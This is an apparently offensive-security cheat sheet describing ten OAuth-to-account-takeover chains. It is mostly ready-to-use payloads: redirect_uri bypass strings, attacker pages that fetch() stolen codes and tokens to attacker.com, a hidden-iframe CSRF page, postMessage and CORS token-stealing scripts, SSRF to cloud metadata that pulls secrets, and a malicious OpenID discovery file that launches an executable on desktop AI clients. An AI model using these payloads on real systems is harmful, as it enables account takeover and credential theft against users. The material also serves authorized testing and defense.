---
tags:
  - critical
---

# OAuth → Account Takeover

From OAuth misconfiguration to complete account compromise.

## Overview

```
OAuth → redirect_uri bypass    → Token theft → ATO
      → Missing state          → CSRF login → ATO
      → postMessage leak       → Token theft → ATO
      → XSS on callback        → Code exfil → ATO
      → Pre-account creation   → Account merge → ATO
```

---

## Chain 1: redirect_uri Manipulation → Token Theft

**Technique:** Bypass redirect_uri validation to steal authorization code/token

### Attack

```bash
# Test variations
?redirect_uri=https://attacker.com
?redirect_uri=https://legit.com/../../../attacker.com
?redirect_uri=https://legit.com@attacker.com
?redirect_uri=https://legit.com%00.attacker.com
?redirect_uri=https://lеgit.com  # Cyrillic е

# If open redirect exists on legit domain
?redirect_uri=https://legit.com/redirect?url=https://attacker.com
```

### Capture Token

```html
<!-- Attacker's callback page -->
<script>
// Capture code from URL
const code = new URLSearchParams(location.search).get('code');
if (code) {
  // Send to attacker server
  fetch('https://attacker.com/steal?code=' + code);
}

// Capture token from fragment
const token = location.hash.match(/access_token=([^&]+)/);
if (token) {
  fetch('https://attacker.com/steal?token=' + token[1]);
}
</script>
```

### Exchange Code for Token

```bash
curl -X POST https://oauth-provider.com/token \
  -d "code=STOLEN_CODE" \
  -d "client_id=TARGET_CLIENT_ID" \
  -d "client_secret=LEAKED_SECRET" \
  -d "redirect_uri=https://legit.com/callback" \
  -d "grant_type=authorization_code"
```

---

## Chain 2: Missing State → CSRF Account Linking

**Technique:** Link attacker's OAuth identity to victim's account

### Attack Flow

```
1. Attacker starts OAuth flow, stops at callback
2. Captures: /callback?code=ATTACKER_CODE
3. Victim clicks attacker's link with captured code
4. Victim's account linked to attacker's OAuth identity
5. Attacker logs in with OAuth → access victim's account
```

### Exploit Page

```html
<h1>Click here for free prize!</h1>
<img src="https://target.com/oauth/callback?code=ATTACKER_CODE" style="display:none">
<!-- OR -->
<iframe src="https://target.com/oauth/callback?code=ATTACKER_CODE" style="display:none"></iframe>
```

---

## Chain 3: response_mode=web_message → postMessage Token Theft

**Technique:** OAuth sends token via postMessage, steal via XSS

### Vulnerable Flow

```javascript
// OAuth provider sends token via postMessage
parent.postMessage({access_token: 'SECRET'}, 'https://legit.com')
```

### Attack (XSS on legit domain)

```html
<!-- If XSS exists on legit.com -->
<script>
window.addEventListener('message', function(e) {
  // Steal OAuth token
  if (e.data.access_token) {
    fetch('https://attacker.com/steal?token=' + e.data.access_token);
  }
});
</script>

<!-- Open OAuth popup -->
<script>
window.open('https://oauth-provider.com/authorize?client_id=...&response_mode=web_message');
</script>
```

### Attack (Subdomain with weak origin check)

```html
<!-- If postMessage origin check uses indexOf() -->
<iframe src="https://legit.com" id="target"></iframe>
<script>
// Our domain: https://attacker-legit.com (contains "legit.com")
// Bypasses: e.origin.indexOf('legit.com') !== -1
</script>
```

---

## Chain 4: XSS on Callback Domain → Code Exfiltration

**Technique:** XSS anywhere on callback domain steals OAuth code via Referer

### Attack

```html
<!-- XSS payload that loads external resource -->
<img src="https://attacker.com/track.gif">

<!-- OAuth callback: /callback?code=SECRET -->
<!-- Referer header leaks: https://target.com/callback?code=SECRET -->
```

### Direct Exfil

```javascript
// XSS payload on any page of callback domain
new Image().src = 'https://attacker.com/steal?url=' + encodeURIComponent(location.href);

// If on callback page
new Image().src = 'https://attacker.com/steal?code=' + new URLSearchParams(location.search).get('code');
```

---

## Chain 5: Pre-Account Takeover (Classic-Federated Merge)

**Technique:** Register account before victim, OAuth merge gives access

### Attack Flow

```
1. Attacker registers classic account with victim@example.com (unverified)
2. Victim later signs up with "Login with Google" using victim@example.com
3. Insecure merge: OAuth email matches → links to existing account
4. Attacker still has access via classic login
```

### Trojan Identifier Variant

```
1. Attacker registers account with victim's email
2. Attacker links secondary identifier (phone, another email)
3. Victim recovers account
4. Attacker uses trojan identifier to regain access
```

---

## Chain 6: Client Secret Exposure → Token Forge

**Technique:** Leaked client_secret allows forging tokens

### Find Secret

```bash
# Mobile app decompilation
strings app.apk | grep -i "client_secret"
jadx -d out app.apk
grep -r "client_secret" out/

# JavaScript bundles
grep -r "client_secret" *.js
grep -r "clientSecret" *.js

# Config files
/config.json
/.env
```

### Forge Tokens

```bash
# Exchange any code (even your own) with stolen secret
curl -X POST https://oauth-provider.com/token \
  -d "code=ANY_VALID_CODE" \
  -d "client_id=LEAKED_ID" \
  -d "client_secret=LEAKED_SECRET" \
  -d "redirect_uri=https://legit.com/callback" \
  -d "grant_type=authorization_code"
```

---

## Chain 7: SSRF → Cloud Metadata → OAuth Secret → ATO

**Technique:** Chain SSRF to steal OAuth client secrets from cloud

### Attack Flow

```bash
# 1. SSRF to AWS metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Use IAM credentials
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 3. Get OAuth secrets from Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id oauth-google-client

# 4. Use stolen client_secret to forge tokens
```

---

## Chain 8: CORS + Subdomain → OAuth Token Theft

**Technique:** CORS trusts subdomains, XSS/takeover on subdomain steals tokens

### Attack Flow

```
1. Find: Access-Control-Allow-Origin: *.target.com
2. Find XSS or takeover on any subdomain
3. Use XSS to make authenticated requests to main domain
4. Steal OAuth tokens/session data via CORS
```

### Exploit

```javascript
// From evil.target.com (subdomain you control)
fetch('https://api.target.com/oauth/token', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

---

## Chain 9: Token Audience Bypass → Cross-App ATO

**Technique:** Token from App A accepted by App B

### Attack

```bash
# 1. Get token from App A (legitimate)
access_token=TOKEN_FROM_APP_A

# 2. Use on App B (different app, same provider)
curl -H "Authorization: Bearer $access_token" \
  https://app-b.com/api/user

# Works if App B doesn't validate audience claim
```

---

## Chain 10: OAuth Discovery URL → Desktop RCE

**Technique:** Malicious OAuth discovery triggers code execution

### CVE-2025-6514 Style

```json
// Malicious .well-known/openid-configuration
{
  "authorization_endpoint": "file:/c:/windows/system32/calc.exe",
  "token_endpoint": "https://evil.com/token"
}

// Desktop clients (Claude Desktop, Cursor) may execute URI directly
```

---

## Bypasses

### redirect_uri Validation Bypass

```bash
# Path traversal
/../../../evil.com
/..%2f..%2f..%2fevil.com

# Subdomain confusion
evil.legit.com
legit.com.evil.com

# Parser confusion
legit.com@evil.com
evil.com#legit.com
legit.com%00.evil.com

# Unicode
lеgit.com  # Cyrillic е
```

### State Parameter Bypass

```
# Static state
state=12345  # Always same

# Predictable state  
state=base64(user_id)

# No state validation
# Remove state parameter entirely
```

---

## Quick Checklist

- [ ] Test redirect_uri manipulation (all variants)
- [ ] Check state parameter presence/validation
- [ ] Look for XSS on callback domain
- [ ] Check response_mode=web_message
- [ ] Search for client_secret in apps/JS
- [ ] Test pre-registration attack
- [ ] Check token audience validation
- [ ] Test CORS + subdomain trust

---

## Impact Template

```
OAuth vulnerability enables Account Takeover:

1. [redirect_uri bypass / missing state / etc.] allows token/code theft
2. Attacker obtains victim's OAuth token
3. Full access to victim's account

Severity: Critical
CVSS: 9.3+ (Network/Low/Required/Changed/High/High)
```

---
*Related: [XSS to ATO](xss-to-ato.md) | [Cache Poison to XSS](cache-poison-to-xss.md)*
